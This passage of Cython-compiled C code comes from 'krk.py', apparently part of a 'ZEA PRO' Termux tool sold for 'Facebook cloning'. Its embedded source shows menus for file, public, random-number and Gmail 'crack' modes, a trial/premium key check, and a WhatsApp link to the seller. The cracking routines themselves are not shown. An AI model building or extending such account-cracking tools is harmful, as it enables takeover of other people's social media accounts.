        if (!__pyx_t_8) {
        } else {
          __pyx_t_9 = __pyx_t_8;
          goto __pyx_L88_bool_binop_done;
        }
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_00, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 197, __pyx_L3_error)
        __pyx_t_9 = __pyx_t_8;
        __pyx_L88_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_8 = __pyx_t_9;
        if (__pyx_t_8) {

          /* "krk.py":198
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
 *                         elif xd in ['0','00']:
 *                                 exit(' Thanks for use  ')             # <<<<<<<<<<<<<<
 *                         else:
 *                                 exit(' Option not found in menu...')
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__33, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 198, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":197
 *                         elif xd in ['8','08']:
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
 *                         elif xd in ['0','00']:             # <<<<<<<<<<<<<<
 *                                 exit(' Thanks for use  ')
 *                         else:
 */
          goto __pyx_L10;
        }

        /* "krk.py":200
 *                                 exit(' Thanks for use  ')
 *                         else:
 *                                 exit(' Option not found in menu...')             # <<<<<<<<<<<<<<
 *                 else:
 *                         print(' \033[1;31mTrail Time Has Been Ended ....')
 */
        /*else*/ {
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 200, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_L10:;

        /* "krk.py":80
 *                 clear()
 *                 x = ("zea")
 *                 if x == ("zea"):             # <<<<<<<<<<<<<<
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')
 *                         linex()
 */
        goto __pyx_L9;
      }

      /* "krk.py":202
 *                                 exit(' Option not found in menu...')
 *                 else:
 *                         print(' \033[1;31mTrail Time Has Been Ended ....')             # <<<<<<<<<<<<<<
 *                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
 *                         clear()
 */
      /*else*/ {
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__35, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 202, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":203
 *                 else:
 *                         print(' \033[1;31mTrail Time Has Been Ended ....')
 *                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)             # <<<<<<<<<<<<<<
 *                         clear()
 *                         print('\033[1;31m First Read Note : ')
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 203, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_time); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 203, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_sleep); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 203, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_int_1};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 203, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":204
 *                         print(' \033[1;31mTrail Time Has Been Ended ....')
 *                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
 *                         clear()             # <<<<<<<<<<<<<<
 *                         print('\033[1;31m First Read Note : ')
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_clear); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 204, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 204, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":205
 *                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
 *                         clear()
 *                         print('\033[1;31m First Read Note : ')             # <<<<<<<<<<<<<<
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
 *                         linex()
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__37, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 205, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":206
 *                         clear()
 *                         print('\033[1;31m First Read Note : ')
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__38, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 206, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":207
 *                         print('\033[1;31m First Read Note : ')
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
 *                         linex()             # <<<<<<<<<<<<<<
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
 *                         print(f" \033[1;37mYour Key : {fkeyx}")
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 207, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 207, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":208
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
 *                         linex()
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')             # <<<<<<<<<<<<<<
 *                         print(f" \033[1;37mYour Key : {fkeyx}")
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__39, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":209
 *                         linex()
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
 *                         print(f" \033[1;37mYour Key : {fkeyx}")             # <<<<<<<<<<<<<<
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
 *                         linex()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_fkeyx); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 209, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 209, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_kp_u_1_37mYour_Key, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 209, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 209, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":210
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
 *                         print(f" \033[1;37mYour Key : {fkeyx}")
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')             # <<<<<<<<<<<<<<
 *                         linex()
 *                         input(" Choose Option : ")
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 210, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 210, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__43, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":211
 *                         print(f" \033[1;37mYour Key : {fkeyx}")
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
 *                         linex()             # <<<<<<<<<<<<<<
 *                         input(" Choose Option : ")
 *                         linex()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 211, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 211, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":212
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
 *                         linex()
 *                         input(" Choose Option : ")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         print(" Your Subscription Date Expire")
 */
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__44, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 212, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":213
 *                         linex()
 *                         input(" Choose Option : ")
 *                         linex()             # <<<<<<<<<<<<<<
 *                         print(" Your Subscription Date Expire")
 *                         linex()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 213, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 213, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":214
 *                         input(" Choose Option : ")
 *                         linex()
 *                         print(" Your Subscription Date Expire")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
 */
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__45, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 214, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":215
 *                         linex()
 *                         print(" Your Subscription Date Expire")
 *                         linex()             # <<<<<<<<<<<<<<
 *                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
 *                         name = input(" Enter your Name : ")
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 215, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 215, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":216
 *                         print(" Your Subscription Date Expire")
 *                         linex()
 *                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="             # <<<<<<<<<<<<<<
 *                         name = input(" Enter your Name : ")
 *                         linex()
 */
        __Pyx_INCREF(__pyx_kp_s_https_api_whatsapp_com_send_phon);
        __pyx_v_url_wa = __pyx_kp_s_https_api_whatsapp_com_send_phon;

        /* "krk.py":217
 *                         linex()
 *                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
 *                         name = input(" Enter your Name : ")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         tks = ("Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 */
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__46, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 217, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_v_name = __pyx_t_5;
        __pyx_t_5 = 0;

        /* "krk.py":218
 *                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
 *                         name = input(" Enter your Name : ")
 *                         linex()             # <<<<<<<<<<<<<<
 *                         tks = ("Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 *                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 218, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 218, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        /* "krk.py":219
 *                         name = input(" Enter your Name : ")
 *                         linex()
 *                         tks = ("Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)             # <<<<<<<<<<<<<<
 *                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
 *                         print(' Run :  python ZEA.py')
 */
        __pyx_t_5 = PyNumber_Add(__pyx_kp_s_Hi_ZEA_Sir_I_Need_To_Buy_Your_Pa, __pyx_v_name); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_Key); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_fkeyx); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = PyNumber_Add(__pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_v_tks = __pyx_t_6;
        __pyx_t_6 = 0;

        /* "krk.py":220
 *                         linex()
 *                         tks = ("Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 *                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)             # <<<<<<<<<<<<<<
 *                         print(' Run :  python ZEA.py')
 *                         linex()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_check_output); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_v_url_wa, __pyx_v_tks); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_13 = PyList_New(3); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_INCREF(__pyx_n_s_am);
        __Pyx_GIVEREF(__pyx_n_s_am);
        PyList_SET_ITEM(__pyx_t_13, 0, __pyx_n_s_am);
        __Pyx_INCREF(__pyx_n_s_start);
        __Pyx_GIVEREF(__pyx_n_s_start);
        PyList_SET_ITEM(__pyx_t_13, 1, __pyx_n_s_start);
        __Pyx_GIVEREF(__pyx_t_5);
        PyList_SET_ITEM(__pyx_t_13, 2, __pyx_t_5);
        __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
